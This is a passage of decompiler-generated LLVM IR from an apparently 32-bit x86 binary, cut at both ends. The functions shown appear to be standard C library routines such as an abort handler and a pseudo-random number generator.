  uselistorder i32 %v1_80529d8, { 1, 0 }
  uselistorder i32 %v2_80529d1, { 1, 0 }
  uselistorder i32 %v1_80529c6, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80529d5, { 1, 0 }
  uselistorder i32 %v1_8052959, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8052954, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8052949, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_8063be0.341 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8063c14.344 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_8063c0c.342, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8052aa9, { 1, 0 }
  uselistorder label %dec_label_pc_8052a98, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8052a54, { 1, 0 }
  uselistorder label %dec_label_pc_8052a33, { 1, 0 }
  uselistorder label %dec_label_pc_80529fe, { 1, 0 }
  uselistorder label %dec_label_pc_80529f6, { 1, 0 }
  uselistorder label %dec_label_pc_80529c2, { 1, 0 }
}

define i32 @function_8052ab1(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052ab1:
  %v0_8052ab1 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8052abe = call i32 @function_805276d(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_8063be0.341 to i8) to i32) to i32*))
  %v0_8052ac3 = load i32, i32* @ebx, align 4
  store i32 %v0_8052ac3, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_8063be0.341 to i32), i32* @edx, align 4
  store i32 %v0_8052ab1, i32* @ebx, align 4
  %v0_8052ace = call i32 @function_80526e0()
  ret i32 %v0_8052ace

; uselistorder directives
  uselistorder i32 ()* @function_80526e0, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_8063be0.341 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i32 (i32*)* @function_805276d, { 0, 4, 1, 2, 3 }
  uselistorder i8* @global_var_8063be0.341, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @function_8052ad4() local_unnamed_addr {
dec_label_pc_8052ad4:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_8052ae0 = call i32 @function_80535cf(i32 ptrtoint (i32* @global_var_805d788.361 to i32))
  %v12_8052aea = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052aef

dec_label_pc_8052aef:                             ; preds = %dec_label_pc_8052aef.dec_label_pc_8052aef_crit_edge, %dec_label_pc_8052ad4
  %v0_8052aef = phi i32 [ %v12_8052aea, %dec_label_pc_8052ad4 ], [ %v0_8052aef.pre, %dec_label_pc_8052aef.dec_label_pc_8052aef_crit_edge ]
  %v1_8052afa21 = phi i32 [ 31, %dec_label_pc_8052ad4 ], [ %v1_8052afa, %dec_label_pc_8052aef.dec_label_pc_8052aef_crit_edge ]
  %v2_8052aef = mul i32 %v1_8052afa21, 4
  %v3_8052aef = add i32 %v2_8052aef, 152
  %v4_8052aef = add i32 %v3_8052aef, %v0_8052aef
  %v5_8052aef = inttoptr i32 %v4_8052aef to i32*
  store i32 0, i32* %v5_8052aef, align 4
  %v0_8052afa.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8052afa = add i32 %v0_8052afa.pre, -1
  %v9_8052afa = icmp slt i32 %v1_8052afa, 0
  store i32 %v1_8052afa, i32* %eax.global-to-local, align 4
  %v1_8052afb = icmp eq i1 %v9_8052afa, false
  br i1 %v1_8052afb, label %dec_label_pc_8052aef.dec_label_pc_8052aef_crit_edge, label %dec_label_pc_8052afd

dec_label_pc_8052aef.dec_label_pc_8052aef_crit_edge: ; preds = %dec_label_pc_8052aef
  %v0_8052aef.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052aef

dec_label_pc_8052afd:                             ; preds = %dec_label_pc_8052aef
  %v0_8052afd = load i32, i32* @ebx, align 4
  %v2_8052b01 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8052b01, i32* @ebx, align 4
  %v4_8052b09 = call i32 @function_8051f04(i32 %v2_8052b01, i32 6, i32 %v0_8052afd, i32 %v0_8052afd)
  store i32 %v4_8052b09, i32* %eax.global-to-local, align 4
  %v1_8052b11 = icmp eq i32 %v4_8052b09, 0
  %v1_8052b13 = icmp eq i1 %v1_8052b11, false
  br i1 %v1_8052b13, label %dec_label_pc_8052b23, label %dec_label_pc_8052b15

dec_label_pc_8052b15:                             ; preds = %dec_label_pc_8052afd
  %v3_8052b1b = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_8052b1b = call i32 @function_8050458(i32 1, %_TYPEDEF_sigset_t* %v3_8052b1b, i32 0)
  store i32 %v4_8052b1b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052b23

dec_label_pc_8052b23:                             ; preds = %dec_label_pc_8052afd, %dec_label_pc_8052b15
  %v2_8052b5b4 = phi i32 [ %v4_8052b09, %dec_label_pc_8052afd ], [ %v4_8052b1b, %dec_label_pc_8052b15 ]
  %v0_8052b23 = load i8, i8* @global_var_8063b00.362, align 256
  %v1_8052b23 = icmp eq i8 %v0_8052b23, 0
  %v1_8052b2a = icmp eq i1 %v1_8052b23, false
  br i1 %v1_8052b2a, label %dec_label_pc_8052b5b, label %dec_label_pc_8052b2c

dec_label_pc_8052b2c:                             ; preds = %dec_label_pc_8052b23
  store i8 1, i8* @global_var_8063b00.362, align 256
  br label %dec_label_pc_8052b33

dec_label_pc_8052b33:                             ; preds = %dec_label_pc_8052b9a, %dec_label_pc_8052b2c
  %v1_8052b3b = call i32 @function_80535cf(i32 ptrtoint (i32* @global_var_805d788.361 to i32))
  store i32 %v1_8052b3b, i32* %eax.global-to-local, align 4
  %v1_8052b47 = call i32 @function_8055250(i32 6)
  store i32 %v1_8052b47, i32* %eax.global-to-local, align 4
  %v1_8052b53 = call i32 @function_80535cf(i32 ptrtoint (i32* @global_var_805d788.361 to i32))
  store i32 %v1_8052b53, i32* %eax.global-to-local, align 4
  %v0_8052b5b.pre = load i8, i8* @global_var_8063b00.362, align 256
  br label %dec_label_pc_8052b5b

dec_label_pc_8052b5b:                             ; preds = %dec_label_pc_8052b23, %dec_label_pc_8052b33
  %v2_8052b5b = phi i32 [ %v2_8052b5b4, %dec_label_pc_8052b23 ], [ %v1_8052b53, %dec_label_pc_8052b33 ]
  %v0_8052b5b = phi i8 [ %v0_8052b23, %dec_label_pc_8052b23 ], [ %v0_8052b5b.pre, %dec_label_pc_8052b33 ]
  %v1_8052b5b = zext i8 %v0_8052b5b to i32
  %v3_8052b5b = and i32 %v2_8052b5b, -256
  %v4_8052b5b = or i32 %v1_8052b5b, %v3_8052b5b
  store i32 %v4_8052b5b, i32* %eax.global-to-local, align 4
  %v10_8052b60 = icmp eq i8 %v0_8052b5b, 1
  %v1_8052b62 = icmp eq i1 %v10_8052b60, false
  br i1 %v1_8052b62, label %dec_label_pc_8052bbc, label %dec_label_pc_8052b64

dec_label_pc_8052b64:                             ; preds = %dec_label_pc_8052b5b
  store i8 2, i8* @global_var_8063b00.362, align 256
  %v2_8052b73 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8052b73, i32* %eax.global-to-local, align 4
  %v3_8052b78 = bitcast i32* %stack_var_-272 to i8*
  %v4_8052b78 = call i32 @function_805143c(i8* %v3_8052b78, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052b8f

dec_label_pc_8052b8f:                             ; preds = %dec_label_pc_8052b8f.dec_label_pc_8052b8f_crit_edge, %dec_label_pc_8052b64
  %v0_8052b8f = phi i32 [ %v12_8052aea, %dec_label_pc_8052b64 ], [ %v0_8052b8f.pre, %dec_label_pc_8052b8f.dec_label_pc_8052b8f_crit_edge ]
  %v1_8052b9720 = phi i32 [ 31, %dec_label_pc_8052b64 ], [ %v1_8052b97, %dec_label_pc_8052b8f.dec_label_pc_8052b8f_crit_edge ]
  %v2_8052b8f = mul i32 %v1_8052b9720, 4
  %v3_8052b8f = add i32 %v2_8052b8f, 16
  %v4_8052b8f = add i32 %v3_8052b8f, %v0_8052b8f
  %v5_8052b8f = inttoptr i32 %v4_8052b8f to i32*
  store i32 -1, i32* %v5_8052b8f, align 4
  %v0_8052b97.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8052b97 = add i32 %v0_8052b97.pre, -1
  %v9_8052b97 = icmp slt i32 %v1_8052b97, 0
  store i32 %v1_8052b97, i32* %eax.global-to-local, align 4
  %v1_8052b98 = icmp eq i1 %v9_8052b97, false
  br i1 %v1_8052b98, label %dec_label_pc_8052b8f.dec_label_pc_8052b8f_crit_edge, label %dec_label_pc_8052b9a

dec_label_pc_8052b8f.dec_label_pc_8052b8f_crit_edge: ; preds = %dec_label_pc_8052b8f
  %v0_8052b8f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052b8f

dec_label_pc_8052b9a:                             ; preds = %dec_label_pc_8052b8f
  store i32 %v2_8052b73, i32* %eax.global-to-local, align 4
  %v5_8052baf = call i32 @function_805380f(i32 6, i32* nonnull %stack_var_-272, i32 0, i32 %v1_8052b97)
  store i32 %v5_8052baf, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052b33

dec_label_pc_8052bbc:                             ; preds = %dec_label_pc_8052b5b
  %v10_8052bbc = icmp eq i8 %v0_8052b5b, 2
  %v1_8052bbe = icmp eq i1 %v10_8052bbc, false
  br i1 %v1_8052bbe, label %dec_label_pc_8052bc8, label %dec_label_pc_8052bc8.thread

dec_label_pc_8052bc8.thread:                      ; preds = %dec_label_pc_8052bbc
  store i8 3, i8* @global_var_8063b00.362, align 256
  br label %dec_label_pc_8052bd1

dec_label_pc_8052bc8:                             ; preds = %dec_label_pc_8052bbc
  %v9_8052bc8 = icmp eq i8 %v0_8052b5b, 3
  %v1_8052bcf = icmp eq i1 %v9_8052bc8, false
  br i1 %v1_8052bcf, label %dec_label_pc_8052be2, label %dec_label_pc_8052bd1

dec_label_pc_8052bd1:                             ; preds = %dec_label_pc_8052bc8.thread, %dec_label_pc_8052bc8
  store i8 4, i8* @global_var_8063b00.362, align 256
  %v1_8052bdd = call i32 @function_80500ac(i32 127)
  unreachable

dec_label_pc_8052be2:                             ; preds = %dec_label_pc_8052bc8, %dec_label_pc_8052be2
  br label %dec_label_pc_8052be2

; uselistorder directives
  uselistorder i32 %v1_8052b97, { 0, 3, 2, 1 }
  uselistorder i32 %v1_8052afa, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 14, 11, 13, 12, 1 }
  uselistorder i8 3, { 0, 5, 3, 4, 2, 1 }
  uselistorder i8* @global_var_8063b00.362, { 5, 4, 3, 0, 2, 1 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @function_8050458, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052be2, { 1, 0 }
  uselistorder label %dec_label_pc_8052bd1, { 1, 0 }
  uselistorder label %dec_label_pc_8052b5b, { 1, 0 }
  uselistorder label %dec_label_pc_8052b23, { 1, 0 }
}

define i32 @function_8052be8(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052be8:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_8052bf0 = load i32, i32* @ebx, align 4
  %v2_8052bfe = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8052bfe, i32* @ebx, align 4
  %v2_8052c03 = call i32 @function_80535d2(i32 %v2_8052bfe, i32 134559183)
  %v1_8052c0f = call i32 @function_80535cf(i32 ptrtoint (i32* @global_var_805d7a0.363 to i32))
  %v2_8052c16 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8052c20 = call i32 @function_8052dc9(i32* nonnull @global_var_805d7b8, i32 %v2_8052c16)
  store i32 ptrtoint (i32* @global_var_805d7b8 to i32), i32* @eax, align 4
  %v2_8052c2a = call i32 @function_80535d2(i32 %v2_8052bfe, i32 1)
  %v3_8052c2f = load i32, i32* %stack_var_-8, align 4
  store i32 %v0_8052bf0, i32* @ebx, align 4
  ret i32 %v3_8052c2f
}

define i32 @function_8052c38(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052c38:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_8052c49 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8052c49, i32* @eax, align 4
  %v2_8052c4e = call i32 @function_80535d2(i32 %v2_8052c49, i32 134559183)
  %v1_8052c5a = call i32 @function_80535cf(i32 ptrtoint (i32* @global_var_805d7a0.363 to i32))
  %v0_8052c66 = load i32, i32* bitcast (i32** @global_var_805d7c0.366 to i32*), align 64
  store i32 %v0_8052c66, i32* @ebx, align 4
  %v3_8052c70 = call i32 @function_8052d30(i32 %arg1, i32* nonnull @global_var_805d7b8)
  %v2_8052c78 = icmp slt i32 %v3_8052c70, 0
  br i1 %v2_8052c78, label %dec_label_pc_8052c7f, label %dec_label_pc_8052c7c

dec_label_pc_8052c7c:                             ; preds = %dec_label_pc_8052c38
  store i32 ptrtoint (i32** @global_var_805d7bc.367 to i32), i32* @esi, align 4
  br label %dec_label_pc_8052c7f

dec_label_pc_8052c7f:                             ; preds = %dec_label_pc_8052c38, %dec_label_pc_8052c7c
  store i32 %v2_8052c49, i32* @eax, align 4
  %v2_8052c88 = call i32 @function_80535d2(i32 %v2_8052c49, i32 1)
  %v0_8052c8d = load i32, i32* @esi, align 4
  ret i32 %v0_8052c8d

; uselistorder directives
  uselistorder label %dec_label_pc_8052c7f, { 1, 0 }
}

define i32 @function_8052c95(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052c95:
  %stack_var_-24 = alloca i32, align 4
  %v2_8052ca4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8052ca4, i32* @ebx, align 4
  %v2_8052ca9 = call i32 @function_80535d2(i32 %v2_8052ca4, i32 134559183)
  %v1_8052cb5 = call i32 @function_80535cf(i32 ptrtoint (i32* @global_var_805d7a0.363 to i32))
  %v0_8052cbf = load i32, i32* bitcast (i32** @global_var_805d7c0.366 to i32*), align 64
  store i32 %v0_8052cbf, i32* @esi, align 4
  %v4_8052cd1 = inttoptr i32 %arg2 to i32*
  %v5_8052cd1 = call i32 @function_8052ebe(i32 %arg1, i32* %v4_8052cd1, i32 %arg3, i32 ptrtoint (i32* @global_var_805d7b8 to i32))
  store i32 %v5_8052cd1, i32* @eax, align 4
  %v2_8052cdc = call i32 @function_80535d2(i32 %v2_8052ca4, i32 1)
  ret i32 ptrtoint (i32** @global_var_805d7bc.367 to i32)
}

define i32 @function_8052cec(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052cec:
  %stack_var_-20 = alloca i32, align 4
  %v0_8052cec = load i32, i32* @ebx, align 4
  %v2_8052cfa = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8052cfa, i32* @ebx, align 4
  %v2_8052cff = call i32 @function_80535d2(i32 %v2_8052cfa, i32 134559183)
  %v1_8052d0b = call i32 @function_80535cf(i32 ptrtoint (i32* @global_var_805d7a0.363 to i32))
  %v2_8052d1b = sext i32 %arg1 to i64
  %v3_8052d1b = call i32 @function_8052e28(i64 %v2_8052d1b, i32 ptrtoint (i32* @global_var_805d7b8 to i32))
  store i32 ptrtoint (i32* @global_var_805d7b8 to i32), i32* @eax, align 4
  %v2_8052d25 = call i32 @function_80535d2(i32 %v2_8052cfa, i32 1)
  store i32 %v0_8052cec, i32* @ebx, align 4
  ret i32 %v2_8052d25

; uselistorder directives
  uselistorder i32* @global_var_805d7b8, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_805d7b8 to i32), { 1, 3, 2, 0 }
}

define i32 @function_8052d30(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_8052d30:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg2 to i32
  %v0_8052d33 = load i32, i32* @ebx, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v1_8052d3f = add i32 %arg1, 4
  store i32 %v1_8052d3f, i32* %esi.global-to-local, align 4
  %v1_8052d42 = add i32 %tmp4, 12
  %v2_8052d42 = inttoptr i32 %v1_8052d42 to i32*
  %v3_8052d42 = load i32, i32* %v2_8052d42, align 4
  store i32 %v3_8052d42, i32* %ecx.global-to-local, align 4
  %v1_8052d45 = add i32 %tmp4, 8
  %v2_8052d45 = inttoptr i32 %v1_8052d45 to i32*
  %v3_8052d45 = load i32, i32* %v2_8052d45, align 4
  %v1_8052d48 = icmp eq i32 %v3_8052d42, 0
  %v1_8052d4a = icmp eq i1 %v1_8052d48, false
  br i1 %v1_8052d4a, label %dec_label_pc_8052d55, label %dec_label_pc_8052d4c

dec_label_pc_8052d4c:                             ; preds = %dec_label_pc_8052d30
  %v1_8052d4c = add i32 %v3_8052d45, -4
  %v2_8052d4c = inttoptr i32 %v1_8052d4c to i32*
  store i32 0, i32* %v2_8052d4c, align 4
  br label %dec_label_pc_8052d65

dec_label_pc_8052d55:                             ; preds = %dec_label_pc_8052d30
  %v1_8052d55 = add i32 %tmp4, 4
  %v2_8052d55 = inttoptr i32 %v1_8052d55 to i32*
  %v3_8052d55 = load i32, i32* %v2_8052d55, align 4
  %v2_8052d58 = sub i32 %v3_8052d55, %v3_8052d45
  %v2_8052d5a = sdiv i32 %v2_8052d58, 4
  %v3_8052d5d = mul i32 %v2_8052d5a, 5
  %v2_8052d60 = add i32 %v3_8052d5d, %v3_8052d42
  store i32 %v2_8052d60, i32* %eax.global-to-local, align 4
  %v2_8052d62 = add i32 %v3_8052d45, -4
  %v3_8052d62 = inttoptr i32 %v2_8052d62 to i32*
  store i32 %v2_8052d60, i32* %v3_8052d62, align 4
  br label %dec_label_pc_8052d65

dec_label_pc_8052d65:                             ; preds = %dec_label_pc_8052d4c, %dec_label_pc_8052d55
  %v0_8052d65 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052d65 = add i32 %v0_8052d65, -4
  %v2_8052d65 = inttoptr i32 %v1_8052d65 to i32*
  %v3_8052d65 = load i32, i32* %v2_8052d65, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_8052d6d = ashr i32 %v3_8052d65, 31
  %v2_8052d6e = zext i32 %v3_8052d65 to i64
  %v4_8052d6e = zext i32 %v1_8052d6d to i64
  %v5_8052d6e = mul nuw i64 %v4_8052d6e, 4294967296
  %v6_8052d6e = or i64 %v5_8052d6e, %v2_8052d6e
  %v8_8052d6e = sdiv i64 %v6_8052d6e, 5
  %v9_8052d6e = trunc i64 %v8_8052d6e to i32
  store i32 %v9_8052d6e, i32* %eax.global-to-local, align 4
  %v10_8052d6e = srem i64 %v6_8052d6e, 5
  %v11_8052d6e = trunc i64 %v10_8052d6e to i32
  %v6_8052d73 = icmp ugt i32 %v11_8052d6e, 4
  br i1 %v6_8052d73, label %dec_label_pc_8052db3, label %dec_label_pc_8052d75

dec_label_pc_8052d75:                             ; preds = %dec_label_pc_8052d65
  %v1_8052d75 = mul i32 %v11_8052d6e, 4
  %v2_8052d75 = add i32 %v1_8052d75, ptrtoint (i32* @global_var_805c2b4.368 to i32)
  %v3_8052d75 = inttoptr i32 %v2_8052d75 to i32*
  %v4_8052d75 = load i32, i32* %v3_8052d75, align 4
  store i32 %v4_8052d75, i32* %ecx.global-to-local, align 4
  %v2_8052d7c = add i32 %v1_8052d75, ptrtoint (i32* @global_var_805c2a0.369 to i32)
  %v3_8052d7c = inttoptr i32 %v2_8052d7c to i32*
  %v4_8052d7c = load i32, i32* %v3_8052d7c, align 4
  store i32 %v4_8052d7c, i32* %ebp.global-to-local, align 4
  %v1_8052d83 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052d83 = add i32 %v1_8052d83, 16
  %v3_8052d83 = inttoptr i32 %v2_8052d83 to i32*
  store i32 %v4_8052d75, i32* %v3_8052d83, align 4
  %v0_8052d86 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8052d86 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052d86 = add i32 %v1_8052d86, 20
  %v3_8052d86 = inttoptr i32 %v2_8052d86 to i32*
  store i32 %v0_8052d86, i32* %v3_8052d86, align 4
  %v1_8052d89 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052d89 = add i32 %v1_8052d89, 12
  %v3_8052d89 = inttoptr i32 %v2_8052d89 to i32*
  store i32 %v11_8052d6e, i32* %v3_8052d89, align 4
  %v1_8052d8c = icmp eq i32 %v11_8052d6e, 0
  br i1 %v1_8052d8c, label %dec_label_pc_8052da6, label %dec_label_pc_8052d90

dec_label_pc_8052d90:                             ; preds = %dec_label_pc_8052d75
  %v0_8052d90 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052d90 = add i32 %v0_8052d90, -4
  %v2_8052d90 = inttoptr i32 %v1_8052d90 to i32*
  %v3_8052d90 = load i32, i32* %v2_8052d90, align 4
  %v1_8052d93 = ashr i32 %v3_8052d90, 31
  %v0_8052d94 = load i32, i32* %edi.global-to-local, align 4
  %v2_8052d94 = zext i32 %v3_8052d90 to i64
  %v4_8052d94 = zext i32 %v1_8052d93 to i64
  %v5_8052d94 = mul nuw i64 %v4_8052d94, 4294967296
  %v6_8052d94 = or i64 %v5_8052d94, %v2_8052d94
  %v7_8052d94 = zext i32 %v0_8052d94 to i64
  %v8_8052d94 = sdiv i64 %v6_8052d94, %v7_8052d94
  %v9_8052d94 = trunc i64 %v8_8052d94 to i32
  %v2_8052d96 = mul i32 %v9_8052d94, 4
  %v3_8052d96 = add i32 %v2_8052d96, %v0_8052d90
  %v1_8052d99 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8052d99 = add i32 %v1_8052d99, %v9_8052d94
  store i32 %v2_8052d99, i32* %eax.global-to-local, align 4
  %v1_8052d9b = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052d9b = add i32 %v1_8052d9b, 4
  %v3_8052d9b = inttoptr i32 %v2_8052d9b to i32*
  store i32 %v3_8052d96, i32* %v3_8052d9b, align 4
  %v0_8052d9e = load i32, i32* %eax.global-to-local, align 4
  %v1_8052d9e = ashr i32 %v0_8052d9e, 31
  %v0_8052d9f = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052d9f = zext i32 %v0_8052d9e to i64
  %v4_8052d9f = zext i32 %v1_8052d9e to i64
  %v5_8052d9f = mul nuw i64 %v4_8052d9f, 4294967296
  %v6_8052d9f = or i64 %v5_8052d9f, %v2_8052d9f
  %v7_8052d9f = zext i32 %v0_8052d9f to i64
  %v8_8052d9f = sdiv i64 %v6_8052d9f, %v7_8052d9f
  %v9_8052d9f = trunc i64 %v8_8052d9f to i32
  store i32 %v9_8052d9f, i32* %eax.global-to-local, align 4
  %v10_8052d9f = srem i64 %v6_8052d9f, %v7_8052d9f
  %v11_8052d9f = trunc i64 %v10_8052d9f to i32
  %v0_8052da1 = load i32, i32* %esi.global-to-local, align 4
  %v2_8052da1 = mul i32 %v11_8052d9f, 4
  %v3_8052da1 = add i32 %v2_8052da1, %v0_8052da1
  %v1_8052da4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052da4 = inttoptr i32 %v1_8052da4 to i32*
  store i32 %v3_8052da1, i32* %v2_8052da4, align 4
  br label %dec_label_pc_8052da6

dec_label_pc_8052da6:                             ; preds = %dec_label_pc_8052d75, %dec_label_pc_8052d90
  %v0_8052da6 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052da6 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052da6 = mul i32 %v1_8052da6, 4
  %v3_8052da6 = add i32 %v2_8052da6, %v0_8052da6
  store i32 %v3_8052da6, i32* %eax.global-to-local, align 4
  %v1_8052da9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052da9 = add i32 %v1_8052da9, 8
  %v3_8052da9 = inttoptr i32 %v2_8052da9 to i32*
  store i32 %v0_8052da6, i32* %v3_8052da9, align 4
  %v0_8052dac = load i32, i32* %eax.global-to-local, align 4
  %v1_8052dac = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052dac = add i32 %v1_8052dac, 24
  %v3_8052dac = inttoptr i32 %v2_8052dac to i32*
  store i32 %v0_8052dac, i32* %v3_8052dac, align 4
  br label %dec_label_pc_8052dc1

dec_label_pc_8052db3:                             ; preds = %dec_label_pc_8052d65
  %v1_8052db3 = call i32 @function_8050568(i32 %v0_8052d33)
  store i32 %v1_8052db3, i32* %eax.global-to-local, align 4
  %v1_8052db8 = inttoptr i32 %v1_8052db3 to i32*
  store i32 22, i32* %v1_8052db8, align 4
  br label %dec_label_pc_8052dc1

dec_label_pc_8052dc1:                             ; preds = %dec_label_pc_8052da6, %dec_label_pc_8052db3
  %storemerge = phi i32 [ -1, %dec_label_pc_8052db3 ], [ 0, %dec_label_pc_8052da6 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8052d33, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_8052da6, { 1, 0 }
  uselistorder i32 %v11_8052d6e, { 2, 1, 3, 0 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder i64 5, { 1, 0 }
  uselistorder label %dec_label_pc_8052dc1, { 1, 0 }
  uselistorder label %dec_label_pc_8052da6, { 1, 0 }
  uselistorder label %dec_label_pc_8052d65, { 1, 0 }
}

define i32 @function_8052dc9(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8052dc9:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8052dcc = load i32, i32* @ebx, align 4
  store i32 %v0_8052dcc, i32* %stack_var_-16, align 4
  store i32 %tmp2, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_8052dd5 = add i32 %tmp2, 8
  %v2_8052dd5 = inttoptr i32 %v1_8052dd5 to i32*
  %v3_8052dd5 = load i32, i32* %v2_8052dd5, align 4
  store i32 %v3_8052dd5, i32* %esi.global-to-local, align 4
  %v1_8052dd8 = add i32 %tmp2, 12
  %v2_8052dd8 = inttoptr i32 %v1_8052dd8 to i32*
  %v3_8052dd8 = load i32, i32* %v2_8052dd8, align 4
  %v4_8052dd8 = icmp eq i32 %v3_8052dd8, 0
  %v1_8052ddc = icmp eq i1 %v4_8052dd8, false
  br i1 %v1_8052ddc, label %dec_label_pc_8052df5, label %dec_label_pc_8052dde

dec_label_pc_8052dde:                             ; preds = %dec_label_pc_8052dc9
  %v2_8052dde = inttoptr i32 %v3_8052dd5 to i32*
  %v3_8052dde = load i32, i32* %v2_8052dde, align 4
  %v5_8052dde = mul i32 %v3_8052dde, 1103515245
  %v1_8052de4 = add i32 %v5_8052dde, 12345
  %v1_8052de9 = urem i32 %v1_8052de4, -2147483648
  store i32 %v1_8052de9, i32* %eax.global-to-local, align 4
  store i32 %v1_8052de9, i32* %v2_8052dde, align 4
  %v0_8052df0 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052df0 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8052df0 = inttoptr i32 %v1_8052df0 to i32*
  store i32 %v0_8052df0, i32* %v2_8052df0, align 4
  br label %dec_label_pc_8052e21

dec_label_pc_8052df5:                             ; preds = %dec_label_pc_8052dc9
  %v1_8052df5 = add i32 %tmp2, 4
  %v2_8052df5 = inttoptr i32 %v1_8052df5 to i32*
  %v3_8052df5 = load i32, i32* %v2_8052df5, align 4
  store i32 %v3_8052df5, i32* %ecx.global-to-local, align 4
  %v2_8052df8 = load i32, i32* %arg1, align 4
  store i32 %v2_8052df8, i32* %edx.global-to-local, align 4
  %v1_8052dfa = add i32 %tmp2, 24
  %v2_8052dfa = inttoptr i32 %v1_8052dfa to i32*
  %v3_8052dfa = load i32, i32* %v2_8052dfa, align 4
  store i32 %v3_8052dfa, i32* %edi.global-to-local, align 4
  %v1_8052dfd = inttoptr i32 %v3_8052df5 to i32*
  %v2_8052dfd = load i32, i32* %v1_8052dfd, align 4
  store i32 %v2_8052dfd, i32* %eax.global-to-local, align 4
  %v1_8052dff = inttoptr i32 %v2_8052df8 to i32*
  %v2_8052dff = load i32, i32* %v1_8052dff, align 4
  %v4_8052dff = add i32 %v2_8052dff, %v2_8052dfd
  store i32 %v4_8052dff, i32* %v1_8052dff, align 4
